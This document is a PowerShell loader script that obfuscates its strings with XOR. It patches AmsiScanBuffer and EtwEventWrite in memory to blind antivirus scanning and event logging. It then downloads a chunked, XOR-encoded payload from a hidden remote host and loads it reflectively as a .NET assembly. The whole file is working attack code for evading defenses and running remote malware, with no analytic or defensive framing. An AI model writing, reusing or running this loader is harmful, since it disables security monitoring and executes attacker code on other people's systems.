# Advanced loader: AMSI (AmsiScanBuffer) + ETW (EtwEventWrite) memory patch,
# obfuscated strings, chunked payload. Windows PowerShell 5.1 (x64).
$ErrorActionPreference = 'SilentlyContinue'

# --- decode obfuscated string table ---
$sb = [Convert]::FromBase64String('cFJDelhTQltSf1ZZU1tSS3BSQ2dFWFR2U1NFUkRES2FeRUNCVltnRVhDUlRDS3tYVlN7XlVFVkVOdktcUkVZUlsEBRlTW1tLVlpEXhlTW1tLdlpEXmRUVll1QlFRUkVLWUNTW1sZU1tbS3JDQHJBUllDYEVeQ1JLZE5EQ1JaGVNbW0t6XlRFWERYUUMZYF5ZBAUZYllEVlFSeVZDXkFSelJDX1hTREtlQlVSQkQZZ0VYUEVWWkt6Vl5ZS19DQ0dEDRgYRVZAGVBeQ19CVUJEUkVUWFlDUllDGVRYWhhfA1RcRFJUGGVyc2NydnpjeHh7ZBhaVl5ZGEVVaEc=')
$s = (-join ($sb | % { [char]($_ -bxor 0x37) })).Split('|')

function Get-DelegateType {
    param([Type[]]$Parameters, [Type]$ReturnType)
    $d = [AppDomain]::CurrentDomain
    $an = New-Object System.Reflection.AssemblyName('D')
    $ab = $d.DefineDynamicAssembly($an, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $mb = $ab.DefineDynamicModule('M', $false)
    $tb = $mb.DefineType('T', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $cb = $tb.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
    $cb.SetImplementationFlags('Runtime, Managed')
    $m = $tb.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
    $m.SetImplementationFlags('Runtime, Managed')
    $tb.CreateType()
}

# --- resolve kernel32 exports without Add-Type ---
$sys = [AppDomain]::CurrentDomain.GetAssemblies() | ? { $_.GlobalAssemblyCache -and $_.Location.Split('\')[-1] -eq $s[9] }
$un  = $sys.GetType($s[10])
$gmh = $un.GetMethod($s[0], [Type[]]@([string]))
$gpa = $un.GetMethod($s[1], [Type[]]@([System.Runtime.InteropServices.HandleRef], [string]))
$k32 = $gmh.Invoke($null, @($s[4]))
$hr  = New-Object System.Runtime.InteropServices.HandleRef($(New-Object IntPtr), $k32)
$vpA = $gpa.Invoke($null, @($hr, $s[2]))
$llA = $gpa.Invoke($null, @($hr, $s[3]))

$vpT = Get-DelegateType @([IntPtr],[UIntPtr],[UInt32],[UInt32].MakeByRefType()) ([bool])
$vp  = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($vpA, $vpT)
$llT = Get-DelegateType @([string]) ([IntPtr])
$ll  = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($llA, $llT)

function Patch-Func($lib, $func, [byte[]]$patch) {
    $h  = $ll.Invoke($lib)
    $hr = New-Object System.Runtime.InteropServices.HandleRef($(New-Object IntPtr), $h)
    $a  = $gpa.Invoke($null, @($hr, $func))
    $o  = 0
    $vp.Invoke($a, [UIntPtr]$patch.Length, 0x40, [ref]$o) | Out-Null
    [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $a, $patch.Length)
}

# AMSI: AmsiScanBuffer -> mov eax,0x80070057; ret  (E_INVALIDARG)
Patch-Func $s[5] $s[6] ([byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3))
# ETW: EtwEventWrite -> xor eax,eax; ret  (STATUS_SUCCESS)
Patch-Func $s[7] $s[8] ([byte[]](0x33,0xC0,0xC3))

# --- chunked payload (XOR 0x6B) ---
$wc = New-Object Net.WebClient
$b64 = ''
1..3 | % { $b64 += $wc.DownloadString($s[13] + "$_.txt") }
$b = [Convert]::FromBase64String($b64)
for ($i=0; $i -lt $b.Length; $i++) { $b[$i] = $b[$i] -bxor 0x6B }
if ($b.Length -lt 2 -or $b[0] -ne 0x4D -or $b[1] -ne 0x5A) {
    throw "Payload decode failed (len=$($b.Length))."
}

[string[]]$arg = @()
if ($args) { $arg = [string[]]$args }
$r = [System.Reflection.Assembly]::Load($b)
$r.GetType($s[11]).GetMethod($s[12], [Type[]]@([string[]])).Invoke($null, @(,$arg))
